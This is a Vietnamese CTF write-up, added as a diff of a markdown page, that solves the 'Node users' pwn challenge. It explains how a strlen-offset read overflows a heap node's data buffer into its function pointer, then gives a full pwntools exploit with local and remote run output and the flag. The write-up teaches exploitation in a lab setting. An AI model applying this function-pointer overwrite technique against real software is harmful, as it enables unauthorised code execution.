@@ -1,0 +1,641 @@
+---
+title: Node user
+description: VCS2025 Red Team CTF
+type: writeup
+ctf: VCS2025 Red Team CTF
+category: pwn
+difficulty: easy
+date: 2026-09-24
+tags:
+  - pwn
+takeaways:
+  - Placeholder takeaway one, shown in the sidebar.
+  - Placeholder takeaway two.
+faq:
+  - q: Is this real research?
+    a: No. This is placeholder content that demonstrates the layout.
+---
+
+
+# VCS2025 CTF Red | Pwn
+
+## Node users
+### Challenge intro
+Đề cho các file sau
+```
+(base) ➜  public ls
+Dockerfile         node_node_node 
+flag               node_node_node.c
+run.sh
+```
+
+Ta thấy có file `Dockerfile` và `run.sh`
+
+Kiểm tra thông tin binary và context của chall
+
+```
+(lit1-inspiron) ➜  public checksec --file=node_node_node
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified      Fortifiable      FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   55 Symbols        No    0              3node_node_node
+```
+
+Bài này không khai thác libc nên ta không cần chú ý đến phiên bản ubuntu từ Dockerfile
+
+:::spoiler - node_node_node.c
+```c
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+#include<fcntl.h>
+#include<string.h>
+
+
+typedef struct node
+{
+    size_t id, n;
+    char data[0x10]; 
+    void (*func_ptr)(char*); 
+    size_t link[0x10]; 
+} node;
+
+// 0x405290:       0x0000000000000000      0x00000000000000b1
+// 0x4052a0:       0x0000000000000000 id   0x0000000000000000  n
+// 0x4052b0:       0x0000000000000000      0x0000000000000000  16 bytes char data
+// 0x4052c0:       0x0000000000401276 func 0xffffffffffffffff  link
+// 0x4052d0:       0xffffffffffffffff      0xffffffffffffffff
+// 0x4052e0:       0xffffffffffffffff      0xffffffffffffffff
+// 0x4052f0:       0xffffffffffffffff      0xffffffffffffffff
+// 0x405300:       0xffffffffffffffff      0xffffffffffffffff
+// 0x405310:       0xffffffffffffffff      0xffffffffffffffff
+// 0x405320:       0xffffffffffffffff      0xffffffffffffffff
+// 0x405330:       0xffffffffffffffff      0xffffffffffffffff
+// 0x405340:       0xffffffffffffffff
+
+
+node *nodes[0x10];
+
+void node_method(char words[])
+{
+    puts(words);
+}
+
+node* Create_Node(size_t id)
+{
+    // call to malloc
+    node *tmp = (node*)malloc(sizeof(node));
+    if(!tmp)
+        return NULL;
+    else
+    {
+        tmp->id = id;
+        tmp->n = 0;
+        tmp->func_ptr = &node_method;
+        memset(tmp->data, 0, sizeof(tmp->data));
+        memset(tmp->link, -1, sizeof(tmp->link));
+        return tmp;
+    }
+}
+
+void Link_Node(size_t src, size_t dest)
+{
+    if(nodes[src] && nodes[dest])
+    {
+        // check for previous link
+        for(int i = 0; i < nodes[src]->n; i++)
+            if(nodes[src]->link[i] == dest)
+                exit(-1);
+
+        // if not previously linked, start linking
+        node *src_node = nodes[src], *dest_node = nodes[dest];
+        src_node->link[src_node->n++] = dest;
+        dest_node->link[dest_node->n++] = src;
+        src_node->func_ptr("Done!");
+    }
+    else
+    {
+        puts("Invalid");
+    }
+}
+
+void Read_Graph(size_t start)
+{
+    size_t is_visited[0x10] = {0}, n;
+    node *node_list[0x10], *tmp;
+
+    if(!nodes[start])
+    {
+        puts("Not created node");
+        return;
+    }
+    
+    node_list[0] = nodes[start];
+    
+    n = 1;
+    while(n)
+    {
+        tmp = node_list[0];
+        printf("Node: %llu\n", tmp->id);
+
+        is_visited[tmp->id] = 1;
+
+        tmp->func_ptr("Data: ");
+        read(0, tmp->data + strlen(tmp->data), 0x10);
+        tmp->func_ptr("Done!");
+
+        for(int i = 0; i < tmp->n; i++)
+        {
+            if(!is_visited[tmp->link[i]])
+                node_list[n++] = nodes[tmp->link[i]];
+        }
+
+        //remove the first element in node_list
+        for(int i = 0; i < n; i++)
+            node_list[i] = node_list[i+1];
+        n--;
+    } 
+    puts("Data saved");
+}
+
+void call_me()
+{
+    system("cat flag");
+}
+
+void menu()
+{
+    puts("1. Create node");
+    puts("2. Link nodes");
+    puts("3. Save data");
+    puts("4. Exit");
+    puts(">> ");
+}
+
+void setup()
+{
+    setvbuf(stdin, 0, 2, 0);
+    setvbuf(stdout, 0, 2, 0);
+    setvbuf(stderr, 0, 2, 0);
+}
+
+int main()
+{
+    size_t choice, id1, id2;
+    setup();
+    memset(nodes, 0, sizeof(nodes));
+    while(1)
+    {
+        menu();
+        scanf("%llu", &choice);
+        switch (choice)
+        {
+        case 1:
+            puts("Id: ");
+            scanf("%llu", &id1);
+            if(id1 < 0x10 && nodes[id1])
+                puts("Node exists");
+            else if(id1 >= 0x10)
+                puts("Invalid id");
+            else
+            {
+                nodes[id1] = Create_Node(id1);
+                nodes[id1]->func_ptr("Created");
+            }
+            break;
+        case 2:
+            puts("Node 1: ");
+            scanf("%llu", &id1);
+            puts("Node 2:");
+            scanf("%llu", &id2);
+            if(id1 < 0x10 && id2 < 0x10 && id1 != id2)
+                Link_Node(id1, id2);
+            else
+                puts("Invalid");
+            break;
+        case 3:
+            puts("Read from: ");
+            scanf("%llu", &id1);
+            Read_Graph(id1);
+            break;
+        case 4:
+            exit(0);
+        default:
+            puts("Invalid choice");
+            break;
+        }
+    }
+    return 0;
+}
+```
+:::
+
+### Phân tích
+Ta thấy đây có thể là một bài heap. Các `node` có cấu trúc, được một mảng chứa các con trỏ trỏ đến các vùng heap được sinh ra từ `malloc()`
+
+```c
+typedef struct node
+{
+    size_t id, n;
+    char data[0x10]; 
+    void (*func_ptr)(char*); 
+    size_t link[0x10]; 
+} node;
+```
+
+
+Mỗi node có id độc nhất của nó, được lưu trên mảng `0x10` phần tử.
+Có vùng lưu data `0x10` bytes
+Một ô nhớ lưu địa chỉ của hàm `(*func_ptr)`, lúc khởi tạo node sẽ được đặt vào đó hàm puts
+```c
+void node_method(char words[])
+{
+    puts(words);
+}
+```
+
+Đồng thời, trong code có hàm `call_me()` sẽ lấy flag từ hệ thống:
+```c
+void call_me()
+{
+    system("cat flag");
+}
+```
+
+Vậy từ đây ta có thể thấy mục tiêu ban đầu sẽ là bằng cách nào đó ghi đè địa chỉ của hàm `call_me()` vào ô nhớ của `(*func_ptr)` trên node.
+
+Ta chỉ có các option:
+- Create node
+- Link node
+- Save data
+
+Không có các tùy chọn chỉnh sửa, xoá note 
+=> Không có UAF, double free, bin poisoning,...
+
+Hàm đọc data duy nhất trong hệ thống cũng không cho thấy khả năng heap overflow 
+
+:::spoiler - full function
+```c
+void Read_Graph(size_t start)
+{
+    size_t is_visited[0x10] = {0}, n;
+    node *node_list[0x10], *tmp;
+
+    if(!nodes[start])
+    {
+        puts("Not created node");
+        return;
+    }
+    
+    node_list[0] = nodes[start];
+    
+    n = 1;
+    while(n)
+    {
+        tmp = node_list[0];
+        printf("Node: %llu\n", tmp->id);
+
+        is_visited[tmp->id] = 1;
+
+        tmp->func_ptr("Data: ");
+        read(0, tmp->data + strlen(tmp->data), 0x10);
+        tmp->func_ptr("Done!");
+
+        for(int i = 0; i < tmp->n; i++)
+        {
+            if(!is_visited[tmp->link[i]])
+                node_list[n++] = nodes[tmp->link[i]];
+        }
+
+        //remove the first element in node_list
+        for(int i = 0; i < n; i++)
+            node_list[i] = node_list[i+1];
+        n--;
+    } 
+    puts("Data saved");
+}
+```
+:::
+
+Hàm đọc data vào sử dụng `read()`, có buffer ptr và `count = 0x10` đầy đủ.
+
+Tuy nhiên cách đọc data của hàm có lỗ hổng:
+
+```c
+tmp->func_ptr("Data: ");
+read(0, tmp->data + strlen(tmp->data), 0x10);
+tmp->func_ptr("Done!");
+```
+
+Hàm `read()` gồm 3 args là:
+- `fd` mode của hàm
+- `buffer`
+- `count`
+
+Ở đây địa chỉ của buffer có cộng thêm `strlen()` của xâu đã được lưu trên vùng data của node đó.
+
+Lợi dụng điều này, ta có thể ghi 2 lần, mỗi lần không quá `0x10`, để ta có thể đẩy phần data thừa sang vùng nhớ của nơi lưu địa chỉ hàm của node.
+
+Lý thuyết như sau:
+```
+0x0000000000000000      0x00000000000000b1
+0x0000000000000000 id   0x0000000000000000  n
+0x0000000000000000      0x0000000000000000  16 bytes char data
+0x0000000000401276 func 0xffffffffffffffff  link
+```
+Ta thấy ô nhớ của `(*func_ptr)` nằm ngay dưới vùng data, có thể bị ghi đè lên.
+
+Khi gọi đến hàm `read()`, data sẽ được ghi vào:
+```c
+tmp->data + strlen(tmp->data)
+
+// tmp là con trỏ node
+```
+Lúc đầu chưa có data nào trên node, vì vậy kết quả của `strlen(tmp->data) = 0`
+
+Sau lần đầu ta ghi vào data `x` (không quá `0x10`) bytes, vị trí ghi tiếp theo sẽ được đẩy lên thành 
+
+```c
+// strlen(tmp-data) = x
+
+tmp->data + strlen(tmp-data)
+// => tmp->data + x
+```
+
+Từ đó ta tiếp tục gọi đến hàm `read()` để được ghi tiếp `0x10` bytes tiếp theo
+
+Sau lần ghi đầu tiên với 15 bytes, ta còn trống một byte trên vùng data để không gây crash chương trình
+```
+0x0000000000000000      0x00000000000000b1
+0x0000000000000000 id   0x0000000000000000  n
+0x6161616161616161      0x0061611661616161  16 bytes char data
+0x0000000000401276 func 0xffffffffffffffff  link
+```
+
+Sau đó ta có thể gọi lần 2 để tiến hành ghi đè sang vùng nhớ của func
+
+```
+0x0000000000000000      0x00000000000000b1
+0x0000000000000000 id   0x0000000000000000  n
+0x6161616161616161      0x6261611661616161  16 bytes char data
+0x6262626262626262 func 0xffffffffffffff62  link
+```
+
+Tiến hành kiểm nghiệm:
+
+ghi lần đầu tiên với 15 bytes:
+```
+Node: 0
+Data: 
+aaaaaaaabbbbbb 
+Done!
+Data saved
+
+0x405290        0x0000000000000000      0x00000000000000b1      ................
+0x4052a0        0x0000000000000000      0x0000000000000000      ................
+0x4052b0        0x6161616161616161      0x000a626262626262      aaaaaaaabbbbbb..
+0x4052c0        0x0000000000401276<func 0xffffffffffffffff      v.@.............
+0x4052d0        0xffffffffffffffff      0xffffffffffffffff      ................
+0x4052e0        0xffffffffffffffff      0xffffffffffffffff      ................
+0x4052f0        0xffffffffffffffff      0xffffffffffffffff      ................
+0x405300        0xffffffffffffffff      0xffffffffffffffff      ................
+0x405310        0xffffffffffffffff      0xffffffffffffffff      ................
+0x405340        0xffffffffffffffff      0x0000000000020cc1      ................         <-- Top chunk
+```
+
+vùng nhớ được đôn lên bởi data lần đầu gồm `a` và `b`
+Sau đó, ta tiến hành ghi lần 2:
+
+```
+Node: 0
+Data: 
+abcdefghik
+
+0x4052a0        0x0000000000000000      0x0000000000000000      ................
+0x4052b0        0x6161616161616161      0x610a626262626262      aaaaaaaabbbbbb.a
+0x4052c0        0x6968676665646362<func 0xffffffffffff0a6b      bcdefghik.......
+0x4052d0        0xffffffffffffffff      0xffffffffffffffff      ................
+0x4052e0        0xffffffffffffffff      0xffffffffffffffff      ................
+0x4052f0        0xffffffffffffffff      0xffffffffffffffff      ................
+0x405300        0xffffffffffffffff      0xffffffffffffffff      ................
+0x405310        0xffffffffffffffff      0xffffffffffffffff      ................
+0x405320        0xffffffffffffffff      0xffffffffffffffff      ................
+0x405330        0xffffffffffffffff      0xffffffffffffffff      ................
+0x405340        0xffffffffffffffff      0x0000000000020cc1      ................         <-- Top chunk
+```
+
+Ta thấy địa chỉ của `(*func_ptr)` đã bị ghi đè.
+
+Như vậy, ta có thể tiến hành viết script khai thác
+
+### Khai thác
+
+Helper functions:
+```python
+def create_node(id, p):
+    p.recvuntil(b'>>')
+    p.sendline(b'1')
+    p.recvuntil(b':')
+    p.sendline(id)
+    
+def link_node(id1, id2, p):
+    p.recvuntil(b'>>')
+    p.sendline(b'2')
+    p.recvuntil(b'1:')
+    p.sendline(id1)
+    p.recvuntil(b'2:')
+    p.sendline(id2)
+    
+def save_data(id, data, p):
+    p.recvuntil(b'>>')
+    p.sendline(b'3')
+    p.recvuntil(b':')
+    p.sendline(id)
+    p.recvuntil(b':')
+    p.send(data)
+
+# no PIE nên ta có thể đặt địa chỉ trực tiếp
+target = 0x4016ec
+```
+
+Tiến hành craft payload:
+```python
+create_node(b'0', p1)
+prep_payload = b'a' * 15
+
+save_data(b'0', prep_payload, p1)
+
+payload = b'a' + p64(0x4016ec) + b'b'
+save_data(b'0', payload, p1)
+
+print(payload)
+
+p1.interactive()
+```
+
+Ta được kết quả như sau:
+```
+(lit1-inspiron) ➜  public python3 test.py
+[+] Starting local process '/home/lit1numyt/ctf/vcs2025/pwn/node_user/public/node_node_node': pid 105933
+b'a\xec\x16@\x00\x00\x00\x00\x00b'
+[*] Switching to interactive mode
+ 0
+Data: 
+VCS{test}
+Data saved
+1. Create node
+2. Link nodes
+3. Save data
+4. Exit
+>> 
+$ 
+[*] Interrupted
+[*] Stopped process '/home/lit1numyt/ctf/vcs2025/pwn/node_user/public/node_node_node' (pid 105933)
+(lit1-inspiron) ➜  public python3 test.py REMOTE
+[+] Opening connection to 103.75.186.106 on port 1337: Done
+b'a\xec\x16@\x00\x00\x00\x00\x00b'
+[*] Switching to interactive mode
+ 0
+Data: 
+FLAG{N0D3_U$ER_1$_7h3_HoLe_tHiNg}
+Data saved
+1. Create node
+2. Link nodes
+3. Save data
+4. Exit
+>> 
+$  
+```
+
+:::success
+`FLAG{N0D3_U$ER_1$_7h3_HoLe_tHiNg}`
+:::
+
+
+:::spoiler - Full script
+```python=
+from pwn import *
+
+###################################################
+###               Context setup                 ###
+###################################################
+
+context.binary = ELF('./node_node_node', checksec=False)
+context.arch   = 'amd64'
+context.os     = 'linux'
+context.log_level = 'info'
+
+#libc = ELF('./libc.so.6', checksec=False)
+
+context.terminal = ['tmux', 'splitw', '-h']
+
+HOST = '103.75.186.106'
+PORT = 1337
+
+def start(argv=[], *a, **kw):
+    """
+    Unified launcher:
+    - LOCAL   → ./node_node_node
+    - GDB     → ./server under gdb
+    - REMOTE  → challenge server
+    """
+    if args.REMOTE:
+        return remote(HOST, PORT)
+    elif args.GDB:
+        return gdb.debug(
+            [context.binary.path] + argv,
+            gdbscript=gdbscript,
+            *a, **kw
+        )
+    else:
+        return process([context.binary.path] + argv, *a, **kw)
+
+
+def dbg(msg=""):
+    if args.DEBUG:
+        log.info(f"[dbg] {msg}")
+        pause()
+    
+    
+def create_node(id, p):
+    p.recvuntil(b'>>')
+    p.sendline(b'1')
+    p.recvuntil(b':')
+    p.sendline(id)
+    
+def link_node(id1, id2, p):
+    p.recvuntil(b'>>')
+    p.sendline(b'2')
+    p.recvuntil(b'1:')
+    p.sendline(id1)
+    p.recvuntil(b'2:')
+    p.sendline(id2)
+    
+def save_data(id, data, p):
+    p.recvuntil(b'>>')
+    p.sendline(b'3')
+    p.recvuntil(b':')
+    p.sendline(id)
+    p.recvuntil(b':')
+    p.send(data)
+
+target = 0x4016ec
+
+###################################################
+###                GDB Script                   ###
+###################################################
+
+gdbscript = '''
+set pagination off
+set disassembly-flavor intel
+b *main
+b *Read_Graph
+b *menu
+continue
+'''
+
+###################################################
+###   Stage 1: Setup heap and trigger UAF       ###
+###################################################
+
+
+p1 = start()
+
+# target = 0x00000000004016ec
+
+# payload = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
+
+# log.info("Creating 3 nodes")
+# create_node(b'0', p1)
+# log.info("user 1 created")
+# create_node(b'1', p1)
+# log.info("user 2 created")
+# create_node(b'2', p1)
+# log.info("user 3 created")
+
+# log.info("Linking all nodes together")
+# link_node(b'0', b'1', p1)
+# link_node(b'1', b'2', p1)
+
+# log.info("Sending payload")
+# save_data(b'0', payload, p1)
+# p1.interactive()
+
+create_node(b'0', p1)
+prep_payload = b'a' * 15
+
+save_data(b'0', prep_payload, p1)
+
+payload = b'a' + p64(0x4016ec) + b'b'
+save_data(b'0', payload, p1)
+
+print(payload)
+
+p1.interactive()
+
+
+###################################################
+###   Stage 2: Cry and begs for help on site    ###
+###################################################
+
+
+```
+:::
